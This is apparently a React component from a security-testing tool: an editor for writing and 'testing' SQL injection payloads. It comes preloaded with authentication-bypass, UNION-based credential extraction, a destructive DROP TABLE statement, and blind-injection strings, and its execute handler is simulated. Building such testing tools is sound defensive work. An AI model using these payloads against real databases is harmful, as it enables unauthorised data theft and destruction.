import React, { useState } from 'react';
import { Editor } from '@monaco-editor/react';
import { Card, CardHeader, CardTitle, CardContent } from '../ui/Card';
import Button from '../ui/Button';

interface PayloadEditorProps {
  className?: string;
  onExecute?: (payload: string) => void;
}

const PayloadEditor: React.FC<PayloadEditorProps> = ({ className = '', onExecute }) => {
  const [payload, setPayload] = useState(`-- Basic SQL injection payloads
' OR '1'='1
' OR 1=1 --
' UNION SELECT null, username, password FROM users --
'; DROP TABLE users; --

-- Time-based blind injection
'; WAITFOR DELAY '00:00:05' --
' AND (SELECT COUNT(*) FROM sysobjects) > 0 WAITFOR DELAY '00:00:05' --

-- Boolean-based blind injection
' AND 1=1 --
' AND 1=2 --
' AND (SELECT SUBSTRING(@@version,1,1))='M' --`);

  const [isExecuting, setIsExecuting] = useState(false);

  const handleExecute = () => {
    if (onExecute && payload.trim()) {
      setIsExecuting(true);
      onExecute(payload.trim());
      setTimeout(() => setIsExecuting(false), 1000); // Simulate execution
    }
  };

  const handleEditorChange = (value: string | undefined) => {
    setPayload(value || '');
  };

  const commonPayloads = [
    {
      name: 'Basic OR injection',
      payload: "' OR '1'='1",
    },
    {
      name: 'Union-based injection',
      payload: "' UNION SELECT null, username, password FROM users --",
    },
    {
      name: 'Time-based blind',
      payload: "'; WAITFOR DELAY '00:00:05' --",
    },
    {
      name: 'Boolean-based blind',
      payload: "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --",
    },
  ];

  return (
    <Card className={className}>
      <CardHeader>
        <CardTitle className="flex items-center justify-between">
          <span>SQL Injection Payload Editor</span>
          <Button
            onClick={handleExecute}
            disabled={!payload.trim()}
            isLoading={isExecuting}
            size="sm"
          >
            Test Payload
          </Button>
        </CardTitle>
      </CardHeader>
      <CardContent>
        <div className="space-y-4">
          {/* Quick payload buttons */}
          <div className="flex flex-wrap gap-2">
            {commonPayloads.map((item, index) => (
              <Button
                key={index}
                variant="ghost"
                size="sm"
                onClick={() => setPayload(item.payload)}
                className="text-xs"
              >
                {item.name}
              </Button>
            ))}
          </div>

          {/* Monaco Editor */}
          <div className="border rounded-md overflow-hidden">
            <Editor
              height="300px"
              defaultLanguage="sql"
              value={payload}
              onChange={handleEditorChange}
              theme="vs-dark"
              options={{
                minimap: { enabled: false },
                scrollBeyondLastLine: false,
                fontSize: 14,
                wordWrap: 'on',
                automaticLayout: true,
                suggestOnTriggerCharacters: true,
                quickSuggestions: true,
                folding: true,
                lineNumbers: 'on',
                renderWhitespace: 'selection',
              }}
            />
          </div>

          {/* Payload info */}
          <div className="text-sm text-muted-foreground">
            <p>
              <strong>Lines:</strong> {payload.split('\n').length} |{' '}
              <strong>Characters:</strong> {payload.length}
            </p>
            <p className="mt-1">
              Use this editor to craft and test SQL injection payloads. Select common payloads from the buttons above or write custom ones.
            </p>
          </div>
        </div>
      </CardContent>
    </Card>
  );
};

export default PayloadEditor;